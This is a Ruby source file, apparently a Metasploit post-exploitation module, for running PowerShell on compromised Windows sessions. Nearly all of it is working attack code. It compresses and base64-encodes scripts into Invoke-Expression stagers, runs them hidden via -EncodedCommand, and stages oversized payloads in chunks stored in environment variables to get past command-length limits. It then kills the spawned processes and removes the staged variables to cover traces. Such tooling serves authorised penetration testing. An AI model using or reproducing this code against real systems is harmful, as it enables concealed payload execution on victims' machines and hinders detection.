# -*- coding: binary -*-
require 'zlib'
require 'msf/core/post/common'

module Msf
class Post
module Windows

module Powershell
	include ::Msf::Post::Common

	def initialize(info = {})
		super
		register_advanced_options(
			[
				OptInt.new('PS_TIMEOUT',   [true, 'Powershell execution timeout', 30]),
				OptBool.new('PS_LOG_OUTPUT', [true, 'Write output to log file', false]),
				OptBool.new('PS_DRY_RUN', [true, 'Write output to log file', false])
			], self.class)
	end

	#
	# Returns true if powershell is installed
	#
 	def have_powershell?
 		cmd_out = cmd_exec("powershell get-host")
 		return true if cmd_out =~ /Name.*Version.*InstanceID/
 		return false
 	end

	#
	# Insert substitutions into the powershell script
	#
	def make_subs(script, subs)
		if ::File.file?(script)
			script = ::File.read(script)
		end

		subs.each do |set|
			script.gsub!(set[0],set[1])
		end
		if datastore['VERBOSE']
			print_good("Final Script: ")
			script.each_line {|l| print_status("\t#{l}")}
		end
		return script
	end

	#
	# Return an array of substitutions for use in make_subs
	#
	def process_subs(subs)
		return [] if subs.nil? or subs.empty?
		new_subs = []
		subs.split(';').each do |set|
			new_subs << set.split(',', 2)
		end
		return new_subs
	end

	#
	# Read in a powershell script stored in +script+
	#
	def read_script(script)
		script_in = ''
		begin
			# Open script file for reading
			fd = ::File.new(script, 'r')
			while (line = fd.gets)
				script_in << line
			end

			# Close open file
			fd.close()
		rescue Errno::ENAMETOOLONG, Errno::ENOENT
			# Treat script as a... script
			script_in = script
		end
		return script_in
	end


	#
	# Return a zlib compressed powershell script
	#
	def compress_script(script_in, eof = nil)

		# Compress using the Deflate algorithm
		compressed_stream = ::Zlib::Deflate.deflate(script_in,
			::Zlib::BEST_COMPRESSION)

		# Base64 encode the compressed file contents
		encoded_stream = Rex::Text.encode_base64(compressed_stream)

		# Build the powershell expression
		# Decode base64 encoded command and create a stream object
		psh_expression =  "$stream = New-Object IO.MemoryStream(,"
		psh_expression += "$([Convert]::FromBase64String('#{encoded_stream}')));"
		# Read & delete the first two bytes due to incompatibility with MS
		psh_expression += "$stream.ReadByte()|Out-Null;"
		psh_expression += "$stream.ReadByte()|Out-Null;"
		# Uncompress and invoke the expression (execute)
		psh_expression += "$(Invoke-Expression $(New-Object IO.StreamReader("
		psh_expression += "$(New-Object IO.Compression.DeflateStream("
		psh_expression += "$stream,"
		psh_expression += "[IO.Compression.CompressionMode]::Decompress)),"
		psh_expression += "[Text.Encoding]::ASCII)).ReadToEnd());"

		# If eof is set, add a marker to signify end of script output
		if (eof && eof.length == 8) then psh_expression += "'#{eof}'" end

		# Convert expression to unicode
		unicode_expression = Rex::Text.to_unicode(psh_expression)

		# Base64 encode the unicode expression
		encoded_expression = Rex::Text.encode_base64(unicode_expression)

		return encoded_expression
	end

	#
	# Get/compare list of current PS processes - nested execution can spawn many children
	# doing checks before and after execution allows us to kill more children...
	# This is a hack, better solutions are welcome since this could kill user
	# spawned powershell windows created between comparisons.
	#
	def get_ps_pids(pids = [])
		current_pids = session.sys.process.get_processes.keep_if {|p|
			p['name'].downcase == 'powershell.exe'
		}.map {|p| p['pid']}
		# Subtract previously known pids
		current_pids = (current_pids - pids).uniq
		return current_pids
	end

	#
	# Execute a powershell script and return the output, channels, and pids. The script
	# is never written to disk.
	#
	def execute_script(script, greedy_kill = false)
		@session_pids ||= []
		running_pids = greedy_kill ? get_ps_pids : []
		open_channels = []
		# Execute using -EncodedCommand
		session.response_timeout = datastore['PS_TIMEOUT'].to_i
		cmd_out = session.sys.process.execute("powershell -EncodedCommand " +
			"#{script}", nil, {'Hidden' => true, 'Channelized' => true}
		)

		# Subtract prior PIDs from current
		if greedy_kill
			Rex::ThreadSafe.sleep(3) # Let PS start child procs
			running_pids = get_ps_pids(running_pids)
		end

		# Add to list of running processes
		running_pids << cmd_out.pid

		# All pids start here, so store them in a class variable
		(@session_pids += running_pids).uniq!

		# Add to list of open channels
		open_channels << cmd_out

		return [cmd_out, running_pids.uniq, open_channels]
	end


	#
	# Powershell scripts that are longer than 8000 bytes are split into 8000
	# 8000 byte chunks and stored as environment variables. A new powershell
	# script is built that will reassemble the chunks and execute the script.
	# Returns the reassembly script.
	#
	def stage_to_env(compressed_script, env_suffix = Rex::Text.rand_text_alpha(8))

		# Check to ensure script is encoded and compressed
		if compressed_script =~ /\s|\.|\;/
			compressed_script = compress_script(compressed_script)
		end
		# Divide the encoded script into 8000 byte chunks and iterate
		index = 0
		count = 8000
		while (index < compressed_script.size - 1)
			# Define random, but serialized variable name
			env_prefix = "%05d" % ((index + 8000)/8000)
			env_variable = env_prefix + env_suffix

			# Create chunk
			chunk = compressed_script[index, count]

			# Build the set commands
			set_env_variable =  "[Environment]::SetEnvironmentVariable("
			set_env_variable += "'#{env_variable}',"
			set_env_variable += "'#{chunk}', 'User')"

			# Compress and encode the set command
			encoded_stager = compress_script(set_env_variable)

			# Stage the payload
			print_good(" - Bytes remaining: #{compressed_script.size - index}")
			cmd_out, running_pids, open_channels = execute_script(encoded_stager, false)
			# Increment index
			index += count

		end

		# Build the script reassembler
		reassemble_command =  "[Environment]::GetEnvironmentVariables('User').keys|"
		reassemble_command += "Select-String #{env_suffix}|Sort-Object|%{"
		reassemble_command += "$c+=[Environment]::GetEnvironmentVariable($_,'User')"
		reassemble_command += "};Invoke-Expression $($([Text.Encoding]::Unicode."
		reassemble_command += "GetString($([Convert]::FromBase64String($c)))))"

		# Compress and encode the reassemble command
		encoded_script = compress_script(reassemble_command)

		return encoded_script
	end

	#
	# Reads output of the command channel and empties the buffer.
	# Will optionally log command output to disk.
	#
 	def get_ps_output(cmd_out, eof, read_wait = 5)

 		results = ''

		if datastore['PS_LOG_OUTPUT']
			# Get target's computer name
			computer_name = session.sys.config.sysinfo['Computer']

			# Create unique log directory
			log_dir = ::File.join(Msf::Config.log_directory,'scripts','powershell', computer_name)
			::FileUtils.mkdir_p(log_dir)

			# Define log filename
			time_stamp  = ::Time.now.strftime('%Y%m%d:%H%M%S')
			log_file    = ::File.join(log_dir,"#{time_stamp}.txt")


			# Open log file for writing
			fd = ::File.new(log_file, 'w+')
		end

		# Read output until eof or nil return output and write to log
		while (1)
			line = ::Timeout.timeout(read_wait) {
				cmd_out.channel.read
			} rescue nil
			break if line.nil?
			if (line.sub!(/#{eof}/, ''))
				results << line
				fd.write(line) if fd
				vprint_good("\t#{line}")
				break
			end
			results << line
			fd.write(line) if fd
			vprint_good("\n#{line}")
		end

		# Close log file
		cmd_out.channel.close()
		fd.close() if fd

		return results
	end

	#
	# Clean up powershell script including process and chunks stored in environment variables
	#
	def clean_up(
		script_file = nil,
		eof = '',
		running_pids =[],
		open_channels = [],
		env_suffix = Rex::Text.rand_text_alpha(8),
		delete = false
	)
		# Remove environment variables
		env_del_command =  "[Environment]::GetEnvironmentVariables('User').keys|"
		env_del_command += "Select-String #{env_suffix}|%{"
		env_del_command += "[Environment]::SetEnvironmentVariable($_,$null,'User')}"

		script = compress_script(env_del_command, eof)
		cmd_out, new_running_pids, new_open_channels = execute_script(script)
		get_ps_output(cmd_out, eof)

		# Kill running processes
		(@session_pids + running_pids + new_running_pids).uniq!
		(running_pids + new_running_pids).each do |pid|
			session.sys.process.kill(pid)
		end


		# Close open channels
		(open_channels + new_open_channels).each do |chan|
			chan.channel.close
		end

		::File.delete(script_file) if (script_file and delete)

		return
	end

	#
	# Simple script execution wrapper, performs all steps
	# required to execute a string of powershell.
	# This method will try to kill all powershell.exe PIDs
	# which appeared during its execution, set greedy_kill
	# to false if this is not desired.
	#
	def psh_exec(script, greedy_kill=true, ps_cleanup=true)
		# Define vars
		eof = Rex::Text.rand_text_alpha(8)
		env_suffix = Rex::Text.rand_text_alpha(8)
		# Check format
		if script =~ /\s|\.|\;/
			script = compress_script(script)
		end
		if datastore['PS_DRY_RUN']
			print_good("powershell -EncodedCommand #{script}")
			return
		else
			# Check 8k cmd buffer limit, stage if needed
			if (script.size > 8100)
				vprint_error("Compressed size: #{script.size}")
				error_msg =  "Compressed size may cause command to exceed "
				error_msg += "cmd.exe's 8kB character limit."
				vprint_error(error_msg)
				vprint_good('Launching stager:')
				script = stage_to_env(script, env_suffix)
				print_good("Payload successfully staged.")
			else
				print_good("Compressed size: #{script.size}")
			end
			# Execute the script, get the output, and kill the resulting PIDs
			cmd_out, running_pids, open_channels = execute_script(script, greedy_kill)
			ps_output = get_ps_output(cmd_out,eof)
			# Kill off the resulting processes if needed
			if ps_cleanup
				vprint_good( "Cleaning up #{running_pids.join(', ')}" )
				clean_up(nil, eof, running_pids, open_channels, env_suffix, false)
			end
			return ps_output
		end
	end

	#
	# Convert binary to byte array, read from file if able
	#
	def build_byte_array(input_data,var_name = Rex::Text.rand_text_alpha(rand(3)+3))
		code = ::File.file?(input_data) ? ::File.read(input_data) : input_data
		code = code.unpack('C*')
		psh = "[Byte[]] $#{var_name} = 0x#{code[0].to_s(16)}"
		lines = []
		1.upto(code.length-1) do |byte|
			if(byte % 10 == 0)
				lines.push "\r\n$#{var_name} += 0x#{code[byte].to_s(16)}"
			else
				lines.push ",0x#{code[byte].to_s(16)}"
			end
		end
		psh << lines.join("") + "\r\n"
	end



end
end
end
end

